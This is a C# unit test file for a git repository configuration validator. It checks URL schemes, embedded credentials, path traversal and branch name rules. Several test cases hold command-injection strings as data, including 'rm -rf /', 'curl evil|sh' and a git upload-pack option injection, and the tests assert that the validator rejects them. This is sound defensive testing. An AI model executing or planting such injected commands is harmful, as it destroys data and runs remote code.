using Andy.Containers.Abstractions;
using Andy.Containers.Api.Services;
using FluentAssertions;
using Xunit;

namespace Andy.Containers.Tests;

public class GitRepositoryValidatorTests
{
    [Fact]
    public void Validate_HttpsUrl_ShouldBeValid()
    {
        var config = new GitRepositoryConfig { Url = "https://github.com/owner/repo.git" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void Validate_SshUrl_ShouldBeValid()
    {
        var config = new GitRepositoryConfig { Url = "git@github.com:owner/repo.git" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void Validate_EmbeddedCredentials_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig { Url = "https://user:token@github.com/owner/repo.git" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Embedded credentials");
    }

    [Fact]
    public void Validate_FileScheme_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig { Url = "file:///etc/passwd" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("https:// and git@");
    }

    [Fact]
    public void Validate_HttpScheme_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig { Url = "http://github.com/owner/repo.git" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("https:// and git@");
    }

    [Fact]
    public void Validate_EmptyUrl_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig { Url = "" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("required");
    }

    [Fact]
    public void Validate_PathTraversal_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "/workspace/../../../etc"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("path traversal");
    }

    [Fact]
    public void Validate_TildeInPath_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "~/workspace"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("path traversal");
    }

    [Fact]
    public void Validate_AbsolutePath_ShouldBeValid()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "/home/user/project"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void Validate_ValidBranch_ShouldBeValid()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "feature/my-branch"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void Validate_BranchWithDoubleDot_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "main..develop"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Invalid branch");
    }

    [Fact]
    public void Validate_BranchWithSpace_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "my branch"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Invalid branch");
    }

    [Fact]
    public void Validate_RelativePath_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "workspace/repo"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("path traversal");
    }

    [Fact]
    public void Validate_BackslashPathTraversal_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "/workspace\\..\\..\\etc"
        };
        var errors = GitRepositoryValidator.Validate(config);
        // Backslash is both a path-traversal hint and a shell metacharacter, so
        // both rules fire. Either is sufficient to block the request.
        errors.Should().Contain(e => e.Contains("path traversal"));
    }

    [Fact]
    public void Validate_BranchEndingWithDot_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "feature."
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Invalid branch");
    }

    [Fact]
    public void Validate_BranchEndingWithSlash_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "feature/"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Invalid branch");
    }

    [Fact]
    public void Validate_BranchWithControlChars_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = "feat\x01ure"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Invalid branch");
    }

    [Fact]
    public void Validate_EmbeddedUsernameOnly_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig { Url = "https://token@github.com/owner/repo.git" };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().ContainSingle().Which.Should().Contain("Embedded credentials");
    }

    [Fact]
    public void Validate_NullBranchAndPath_ShouldBeValid()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = null,
            TargetPath = null
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void Validate_RelativePathWithDotSlash_ShouldBeValid()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = "./workspace/repo"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().BeEmpty();
    }

    [Fact]
    public void ValidateAll_EmptyList_ShouldReturnNoErrors()
    {
        var errors = GitRepositoryValidator.ValidateAll(new List<GitRepositoryConfig>());
        errors.Should().BeEmpty();
    }

    [Fact]
    public void ValidateAll_MultipleRepos_CollectsAllErrors()
    {
        var configs = new List<GitRepositoryConfig>
        {
            new() { Url = "https://github.com/owner/repo1.git" },
            new() { Url = "file:///bad" },
            new() { Url = "https://github.com/owner/repo2.git", Branch = "my branch" }
        };
        var errors = GitRepositoryValidator.ValidateAll(configs);
        errors.Should().HaveCount(2);
        errors[0].Should().StartWith("Repository [1]:");
        errors[1].Should().StartWith("Repository [2]:");
    }

    [Theory]
    [InlineData("https://github.com/owner/repo.git;curl evil")]
    [InlineData("https://github.com/owner/repo.git`id`")]
    [InlineData("https://github.com/owner/repo.git$(id)")]
    [InlineData("https://github.com/owner/repo.git|sh")]
    [InlineData("https://github.com/owner/repo.git&whoami")]
    [InlineData("git@host:/tmp';curl evil|sh;'")]
    public void Validate_UrlWithShellMetacharacters_ShouldBeRejected(string maliciousUrl)
    {
        var config = new GitRepositoryConfig { Url = maliciousUrl };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().Contain(e => e.Contains("not allowed"));
    }

    [Theory]
    [InlineData("main;rm -rf /")]
    [InlineData("main$(id)")]
    [InlineData("main`id`")]
    [InlineData("main|sh")]
    [InlineData("-uupload-pack=foo")]
    public void Validate_BranchWithShellMetacharactersOrLeadingDash_ShouldBeRejected(string maliciousBranch)
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            Branch = maliciousBranch
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().Contain(e => e.Contains("Invalid branch"));
    }

    [Theory]
    [InlineData("/workspace/repo;rm -rf /")]
    [InlineData("/workspace/$(id)")]
    [InlineData("/workspace/`whoami`")]
    public void Validate_TargetPathWithShellMetacharacters_ShouldBeRejected(string maliciousPath)
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/owner/repo.git",
            TargetPath = maliciousPath
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().Contain(e => e.Contains("not allowed"));
    }

    [Fact]
    public void Validate_UrlExceedingMaxLength_ShouldBeRejected()
    {
        var config = new GitRepositoryConfig
        {
            Url = "https://github.com/" + new string('a', 3000) + "/repo.git"
        };
        var errors = GitRepositoryValidator.Validate(config);
        errors.Should().Contain(e => e.Contains("maximum length"));
    }

    [Fact]
    public void ValidateAll_AllValid_ShouldReturnNoErrors()
    {
        var configs = new List<GitRepositoryConfig>
        {
            new() { Url = "https://github.com/owner/repo1.git" },
            new() { Url = "git@github.com:owner/repo2.git", Branch = "main" }
        };
        var errors = GitRepositoryValidator.ValidateAll(configs);
        errors.Should().BeEmpty();
    }
}
